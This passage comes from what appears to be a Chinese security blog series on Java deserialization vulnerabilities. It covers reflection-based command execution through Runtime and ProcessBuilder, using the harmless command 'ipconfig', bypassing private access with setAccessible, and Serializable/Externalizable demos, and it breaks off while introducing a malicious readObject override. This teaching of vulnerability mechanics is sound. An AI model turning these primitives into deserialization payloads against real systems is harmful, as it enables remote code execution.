<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> person.newInstance();<span class="comment">//得到object</span></span><br><span class="line">person.getDeclaredMethod(<span class="string">&quot;setAge&quot;</span>, String.class).invoke(o,<span class="string">&quot;11&quot;</span>);<span class="comment">//call setAge()方法</span></span><br></pre></td></tr></table></figure>

<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="java-lang-Runtime命令执行及访问private的方法"><a href="#java-lang-Runtime命令执行及访问private的方法" class="headerlink" title="java.lang.Runtime命令执行及访问private的方法"></a>java.lang.Runtime命令执行及访问private的方法</h2><p>我们在反序列化漏洞中会遇到的<code>java.lang.Runtime</code>是执行命令的最常见的方式。</p>
<p>以下是java执行命令的语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;ipconfig&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>那如果我们要用<code>java</code>的反射机制来执行这段代码应该如何操作呢？</p>
<p>于是我写下了这段代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; runTimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//先找到Runtime这个Class的Class类</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runTimeClass.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);<span class="comment">//找到exec这个method</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> runTimeClass.newInstance();<span class="comment">//创建一个新的Runtime的实例</span></span><br><span class="line">exec.invoke(o1,<span class="string">&quot;ipconfig&quot;</span>);<span class="comment">//在实例中call exec()这个method</span></span><br></pre></td></tr></table></figure>

<p>但是奇怪的事情发生了：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721214436241.png" alt="image-20210721214436241"></p>
<p>代码提示19行出错 - 我们不能访问<code>private</code>属性的成员。难道是<code>constructor</code>有问题吗？</p>
<p>我们尝试进入<code>Runtime Class</code>中看一下：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721214751377.png" alt="image-20210721214751377"> 果然，该构造方法是<code>private</code>的，加上前面所提到的，<code>className.newInstance()</code>是直接使用无参构造，所以我们不能直接创建这个<code>instance</code>。 </p>
<p>如何解决呢？我们有两个方法</p>
<ol>
<li><p><strong>getRuntime()</strong></p>
<p>其实之前我们就有写到执行语句是<code>Runtime.getRuntime().exec(&quot;ipconfig&quot;);</code>此处我们就没有new一个新的<code>instance</code>，反而是直接用<code>getter</code>来获取到<code>Runtime</code>。</p>
<p>所以我们在此处可以这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; runTimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//先找到Runtime这个Class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runTimeClass.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);<span class="comment">//找到exec这个method</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> runTimeClass.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>);<span class="comment">//找到getRuntime()这个method</span></span><br><span class="line">Object o1=getRuntime.invoke(<span class="literal">null</span>);<span class="comment">//call getRuntime()来获取到Runtime实例</span></span><br><span class="line">exec.invoke(o1,<span class="string">&quot;ipconfig&quot;</span>);<span class="comment">//执行方法</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>setAccessible() - 访问private方法</strong> </p>
<p><code>Java</code>会对<code>private</code>的方法进行禁止访问的操作，而<code>setAccessible</code>可以让我们禁止或允许<code>Java</code>语言的访问检查，当我们设置<code>setAccessible(true)</code>时，我们便可以访问<code>private</code>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; runTimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//先找到Runtime这个Class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runTimeClass.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);<span class="comment">//找到exec这个method</span></span><br><span class="line">Constructor&lt;?&gt; declaredConstructor = runTimeClass.getDeclaredConstructor();<span class="comment">//不带参数的getConstructor是会获取到无参构造方法的，但因为Runtime的Constructor是private的，所以我们需要使用Declared</span></span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);<span class="comment">//禁止java语言访问检查，让我们可以访问这个私有的constructor</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> declaredConstructor.newInstance();<span class="comment">//通过该constructor来创建新的instance</span></span><br><span class="line">exec.invoke(o1,<span class="string">&quot;ipconfig&quot;</span>);<span class="comment">//完成命令执行</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="java-lang-ProcessBuilder命令执行"><a href="#java-lang-ProcessBuilder命令执行" class="headerlink" title="java.lang.ProcessBuilder命令执行"></a>java.lang.ProcessBuilder命令执行</h2><p>知道我们是通过<code>exec()</code>执行代码后，我们接下来想要弄清楚，<code>exec()</code>是怎么工作的。在尝试跟随exec()方法后，我们最终来到了如下地方：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721221330679.png" alt="image-20210721221330679"></p>
<p>可见我们创建了一个<code>ProcessBuilder</code>的<code>instance</code>，同时向其中传入了我们需要执行的命令<code>cmdArray</code>，<code>cmdArray</code>也是以<code>String[]</code>的类型传入的。</p>
<p>进入<code>Processbuilder</code>可以看到它有两个<code>constructor</code>，一个是传入有参数的(<code>List&lt;String&gt;类型</code>)，一个是传入无参数的(<code>String[]类型</code>),注意,这里<code>String...</code>等价于<code>String[]</code></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721222648669.png" alt="image-20210721222648669"></p>
<p>再看<code>start()</code>方法</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721221932382.png" alt="image-20210721221932382"></p>
<p>传入的<code>command</code>又会被转化为<code>Array</code>，最后开始创建子程序执行等等（就不深入探究了）</p>
<p>综上所述，我们只需要执行<code>new ProcessBuilder.start()</code>即可完成命令执行</p>
<p>于是我们写出如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; processBuilderClass = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);<span class="comment">//获取到ProcessBuilder这个class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">start</span> <span class="operator">=</span> processBuilderClass.getDeclaredMethod(<span class="string">&quot;start&quot;</span>);<span class="comment">//获取到start()这个方法</span></span><br><span class="line"><span class="comment">//因为两个constructor都是public的，所以我们可以只用用getConstructor而不用getDeclaredConstructor</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">oWithArg</span> <span class="operator">=</span> processBuilderClass.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;ipconfig&quot;</span>,<span class="string">&quot;/all&quot;</span>));<span class="comment">//获取带参数的命令的instance</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">oNoArg</span> <span class="operator">=</span> processBuilderClass.getConstructor(String[].class).newInstance((Object) <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;ipconfig&quot;</span>&#125;);<span class="comment">//获取不带参数的命令的instance</span></span><br><span class="line">Process argStart=(Process) start.invoke(oWithArg);</span><br><span class="line">Process noArgStart=(Process) start.invoke(oNoArg);</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">argIn</span> <span class="operator">=</span> argStart.getInputStream();<span class="comment">//获取Process的输出流来作为输入字节流</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">noArgIn</span> <span class="operator">=</span> noArgStart.getInputStream();<span class="comment">//获取Process的输出流来作为输入字节流</span></span><br><span class="line">InputStreamReader argReader=<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(argIn);<span class="comment">//把字节流转化为字符流</span></span><br><span class="line">InputStreamReader noArgReader=<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(noArgIn);<span class="comment">//把字节流转化为字符流</span></span><br><span class="line">BufferedReader argBr=<span class="keyword">new</span> <span class="title class_">BufferedReader</span>(argReader);<span class="comment">//为字符流提供缓冲区，以便一次性读取整块数据</span></span><br><span class="line">BufferedReader noArgBr=<span class="keyword">new</span> <span class="title class_">BufferedReader</span>(noArgReader);<span class="comment">//为字符流提供缓冲区，以便一次性读取整块数据</span></span><br><span class="line"></span><br><span class="line">String line=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">while</span>((line=argBr.readLine())!=<span class="literal">null</span>)&#123;<span class="comment">//一行行读取</span></span><br><span class="line">    System.out.println(line);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>((line=noArgBr.readLine())!=<span class="literal">null</span>)&#123;<span class="comment">//一行行读取</span></span><br><span class="line">    System.out.println(line);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721232833104.png" alt="image-20210721232833104"></p>
<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><ul>
<li><p>Java反射机制是Java这个静态语言中的动态特性，它让我们能够获取到、执行任意类的方法、变量，也能创建任意类的对象。</p>
</li>
<li><p><code>Class</code>被初始化时会自动执行<code>static&#123;&#125;</code>中的内容，此处可以被利用。</p>
</li>
<li><p><code>Declared</code>关键字让我们可以获取处继承类以外的所有方法。</p>
</li>
<li><p><code>setAccessible(true)</code>可以访问private方法，不被<code>java</code>语言进行访问检测。</p>
</li>
<li><p>我们可以通过Java反射机制利用Runtime和ProcessBuilder执行命令</p>
</li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.guildhab.top/2020/04/java-rmi-%e5%88%a9%e7%94%a82-java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e/">Epicccal - Java 反序列化漏洞(2) – Java 反射机制</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之Java反序列化流程与分析(3)</title>
    <url>/2021/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90-3/</url>
    <content><![CDATA[<h1 id="什么是Java序列化和反序列化？"><a href="#什么是Java序列化和反序列化？" class="headerlink" title="什么是Java序列化和反序列化？"></a>什么是Java序列化和反序列化？</h1><p>在Java中，序列化是为了方便传输存储数据的一种方式。</p>
<blockquote>
<p>If we want to transfer an object, for instance, store it on a disk or send it over a network, we need to transform it into a byte stream.</p>
</blockquote>
<p><strong>Java序列化</strong>会将一个object转换成<code>byte[]</code>，也就是一个含有object状态（属性信息）的二进制数组。Java序列化会使用<strong>Java反射</strong>来获取到需要被序列化的数据，包括private和final的fields。<strong>常用writeObject()来序列化Object。</strong></p>
<blockquote>
<p>Java serialization uses reflection to scrape all the data from the object’s fields that need to be serialized. This includes private and final fields</p>
</blockquote>
<span id="more"></span>

<p><strong>Java反序列化</strong>会根据该二进制流，<strong>重新创建</strong>一个相同状态下的object。Java反序列化不会用<code>constructor</code>来创建一个object，相反，他会创建一个空的object，然后用<strong>Java反射</strong>把数据写进属性里，所以在重新创建object的时候，<code>constructor</code>里的代码是不会被执行的（除了实现Externalizable接口的Class，之后会提到）。<strong>常用readObject()来反序列化Object。</strong></p>
<blockquote>
<p>When deserializing a byte stream back to an object it does not use the constructor. It creates an empty object and uses reflection to write the data to the fields.</p>
</blockquote>
<p>显而易见，Java在序列化和反序列化的过程中，都用到了<a href="https://leihehehe.github.io/2021/07/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6-1/">Java反射机制</a>（需要注意的是，实现Externalizable接口并不会使用Java反射机制，这一点会在后面的内容中讲到），而整个过程其实就是数据转换为二进制流，再根据数据<strong>重新创建</strong>一个相同的object。</p>
<h1 id="Java序列化和反序列的实现"><a href="#Java序列化和反序列的实现" class="headerlink" title="Java序列化和反序列的实现"></a>Java序列化和反序列的实现</h1><h2 id="Serializable接口"><a href="#Serializable接口" class="headerlink" title="Serializable接口"></a>Serializable接口</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>如果一个Class想要被序列化，那么他<strong>必须</strong><code>implements Serializable</code>。</p>
<blockquote>
<p>The serialization interface has no methods or fields and serves only to identify the semantics of being serializable. </p>
</blockquote>
<p>Serializable接口没有任何的方法或属性，它只是用来标识该Class是否可以被序列化。</p>
<p>根据官方注解，序列化的Class会有一个<code>serialVersionUID</code>，它会在<strong>反序列化</strong>的时候，被用来验证发送者和接收者是否有一样的<code>serialVersionUID</code>。需要注意的是，我们所声明的<code>serialVersionUID</code>，必须为 <code>static final long serialVersionUID</code>。</p>
<p>如果不声明<code>serialVersionUID</code>，Java在序列化的时候会计算默认的<code>serialVersionUID</code>值，但官方强烈建议所有Serializable Class都声明该值，避免一些不必要的错误。</p>
<h3 id="编写Serializable-Class"><a href="#编写Serializable-Class" class="headerlink" title="编写Serializable Class"></a>编写Serializable Class</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span><span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;shulei&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要被序列化的Class，都要实现<code>Serializable</code>接口。</p>
<h3 id="编写实现序列化与反序列化Class"><a href="#编写实现序列化与反序列化Class" class="headerlink" title="编写实现序列化与反序列化Class"></a>编写实现序列化与反序列化Class</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializableTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Student student=<span class="keyword">new</span> <span class="title class_">Student</span>();<span class="comment">//create a Student instance</span></span><br><span class="line">        serializeObj(student);</span><br><span class="line">        deserializeObj();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeObj</span><span class="params">(Student student)</span> <span class="keyword">throws</span> Exception &#123;<span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.cer&quot;</span>);<span class="comment">//创建一个文件输出流，文件名为test.cer</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);<span class="comment">//创建一个对象输出流，对象数据流中的数据将输出到文件输出流中</span></span><br><span class="line">        objectOutputStream.writeObject(student);<span class="comment">//将student这个object输入到文件输出流中</span></span><br><span class="line">        objectOutputStream.close();<span class="comment">//关闭文件输出流和对象输出流，避免内存泄露</span></span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">//序列化完成</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeObj</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.cer&quot;</span>);<span class="comment">//创建文件输入流，读取test.cer</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);<span class="comment">//创建对象输入流，将文件输入流里的数据输入对象输入流</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span>(Student)objectInputStream.readObject();<span class="comment">//读取输入流中的对象，强制转换为Student类型，重构对象</span></span><br><span class="line">        student.hello();<span class="comment">//call方法</span></span><br><span class="line">        <span class="comment">//反序列化完成</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728193330087.png" alt="image-20210728193330087"></p>
<h2 id="Externalizable接口"><a href="#Externalizable接口" class="headerlink" title="Externalizable接口"></a>Externalizable接口</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>除了通过<code>implements Serializable</code>来让Class可序列化，我们同样可以使用<code>Externalizable</code>来标识Class是可序列化的。</p>
<p>进入<code>Externalizable interface</code>可以看到以下结构：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Externalizable</span> <span class="keyword">extends</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际上，<code>Externalizable</code>是继承了<code>Serializable</code>，这也就能说明为什么它也能够用来表示Class是可序列化的了。但不同的是，这里有两个额外的method，<code>writeExternal()</code>和<code>readExternal()</code>。</p>
<p>所以当我们实现<code>Externalizable</code>接口的时候，我们需要重写这两个method。</p>
<p><code>writeExternal()</code>和<code>readExternal()</code>分别替代了<code>writeObject()</code>和<code>readObject()</code>两个methods,开发者需要手动对数据进行序列化和反序列化，这意味着，我们可以<strong>选择性</strong>地序列化和反序列化某些属性，相比Serializable接口就更加的灵活了。</p>
<p>此外，实现<code>Externalizable</code>的Class必须要有默认的<strong>无参构造函数</strong>，因为Externalizable在反序列化时<strong>不使用反射机制</strong>，所以它必须要有<code>constructor</code>。采用Externalizable无需产生<code>serialVersionUID</code>，而Serializable接口需要。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728231725366.png" alt="image-20210728231725366"></p>
<h3 id="编写Externalizable-Class"><a href="#编写Externalizable-Class" class="headerlink" title="编写Externalizable Class"></a>编写Externalizable Class</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XiaoXueSheng</span>  <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">XiaoXueSheng</span><span class="params">()</span> &#123;<span class="comment">//此无参数的构造方法必须存在</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">XiaoXueSheng</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.writeObject(name);<span class="comment">//将name写入对象输出流和文件输出流</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String)in.readObject();<span class="comment">//从对象输入流中获取name</span></span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们在<code>writeExternal()</code>方法中写入name属性，并在<code>readExternal()</code>中取出赋值给当前Class的name属性。相反另一个属性<code>age</code>并没有被我们序列化。</p>
<p>那么可以思考一下，当我们反序列化后，我们得到的age是什么值呢？</p>
<h3 id="编写实现序列化和反序列化Class"><a href="#编写实现序列化和反序列化Class" class="headerlink" title="编写实现序列化和反序列化Class"></a>编写实现序列化和反序列化Class</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializableTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">XiaoXueSheng</span> <span class="variable">xiaoXueSheng</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XiaoXueSheng</span>(<span class="string">&quot;Leihehe&quot;</span>,<span class="number">21</span>);</span><br><span class="line">        <span class="comment">//我们创建一个有name和age的值的object</span></span><br><span class="line">        serializeObj(xiaoXueSheng);<span class="comment">//序列化该object</span></span><br><span class="line">        deserializeObj();<span class="comment">//反序列化该object</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeObj</span><span class="params">(XiaoXueSheng xiaoXueSheng)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.cer&quot;</span>);<span class="comment">//创建一个文件输出流，文件名为test.cer</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);<span class="comment">//创建一个对象输出流，对象数据流中的数据将输出到文件输出流中</span></span><br><span class="line">        objectOutputStream.writeObject(xiaoXueSheng);<span class="comment">//将xiaoXueSheng这个object输入到文件输出流中</span></span><br><span class="line">        objectOutputStream.close();<span class="comment">//关闭文件输出流和对象输出流，避免内存泄露</span></span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeObj</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.cer&quot;</span>);<span class="comment">//创建文件输入流，读取test.cer</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);<span class="comment">//创建对象输入流，将文件输入流里的数据输入对象输入流</span></span><br><span class="line">        XiaoXueSheng xiaoXueSheng=(XiaoXueSheng) objectInputStream.readObject();<span class="comment">//重构object,将反序列化得到的数据重新赋值到新的object中</span></span><br><span class="line">        System.out.println(xiaoXueSheng.getName());</span><br><span class="line">        System.out.println(xiaoXueSheng.getAge());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们创建了一个name为Leihehe, age为21的object，将它进行序列化和反序列化。</p>
<p>在反序列化操作后，我们将object中的name和age输出。</p>
<h3 id="运行测试-1"><a href="#运行测试-1" class="headerlink" title="运行测试"></a>运行测试</h3><p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728200635043.png" alt="image-20210728200635043"></p>
<p>我们发现<code>name</code>被正常输出了，但<code>age</code>为initilised value，这就解答了之前的问题。</p>
<p>在可序列化Class <code>XiaoxueSheng</code>中，我们只规定将<code>name</code>序列化和反序列化，并未序列化<code>age</code>，所以当反序列化创建新的object后(执行<strong>无参</strong><code>constructor</code>)，<code>age</code>并未被赋值，而是最初的状态。</p>
<h1 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h1><h3 id="什么是反序列化漏洞？"><a href="#什么是反序列化漏洞？" class="headerlink" title="什么是反序列化漏洞？"></a>什么是反序列化漏洞？</h3><blockquote>
<p>A Java deserialize vulnerability is a security vulnerability that occurs when a malicious user tries to insert a modified serialized object into the system that eventually compromises the system or its data. </p>
</blockquote>
<p>敲重点：Java<strong>反序列化</strong>了被<strong>恶意修改</strong>的<strong>序列化对象</strong>(须是服务器中存在的对象或者依赖包中的对象)。</p>
<h3 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h3><p>根据Java官方说明，任何实现Serializable接口的Class都可以定义自己的<code>readObject()</code>方法，只要在重写方法的同时执行了<code>defaultReadObject()</code>方法即可。这样在反序列化的时候会自动invoke该Class下自己定义的<code>readObject()</code>方法。</p>
<p>那么我们可以为Class重写一个它自己的<code>readObject()</code>的方法，里面带有恶意执行代码，让Java去反序列化这个我们修改后的Object，这样<code>readObject()</code>被执行的时候，恶意代码也就被执行了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span><span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;shulei&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> 